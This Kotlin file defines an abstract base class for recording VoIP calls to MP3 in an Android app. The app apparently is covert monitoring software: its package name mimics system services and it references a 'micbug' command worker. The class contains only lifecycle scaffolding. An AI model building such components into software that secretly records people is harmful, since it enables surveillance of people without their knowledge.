package com.android.services.workers.voip

import android.content.Context
import android.content.Intent
import android.os.PowerManager
import androidx.work.Data
import com.android.services.interfaces.IWorkerProcessing
import com.android.services.models.VoipCallRecord
import com.android.services.util.Mp3LameRecorder
import com.android.services.workers.micbug.MicBugCommandWorker
import io.reactivex.rxjava3.disposables.Disposable
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

abstract class VoipCallRecordProcessingBase(
    val applicationContext: Context,
) : IWorkerProcessing {
    internal val executorService: ExecutorService = Executors.newSingleThreadExecutor()
    internal var recorder: Mp3LameRecorder? = null
    internal lateinit var randomUniqueId: String
    internal lateinit var mFilePath: String
    internal var mRecordingStartTime: Long = 0
    internal var wakeLock: PowerManager.WakeLock? = null
    internal var voipCallRecord: VoipCallRecord? = null
    internal var disposable: Disposable? = null

    companion object {
        internal const val TOS_VOIP_CALL_WORK = "myApp:TOSVoipCallWork"
         val VOIP_CALL_RECORD = VoipCallRecordWorkerService::class.java.name.toString()
        internal const val INITIAL_DELAY = 30 * 1000L
        internal const val PERIODIC_INTERVAL = 30 * 1000L
        internal var intervalConsumed: Int = 0
        const val VOIP_CALL_RECORD_NOTIFICATION_ID = 106
        const val TAG_VOIP_CALL_RECORDING_WORKER="TAG_VOIP_CALL_RECORDING_WORKER"

        @JvmStatic
        var voipCallStatus: String? = null
    }

    abstract fun initialize()
    abstract fun parseIntent(data: Data?)
    abstract fun createOutputFilePath()
    abstract fun startRecording()
    abstract fun startCommand()
    abstract suspend fun stopRecording()
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(data: Data) {
        startCommand()
        createOutputFilePath()
        parseIntent(data)
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}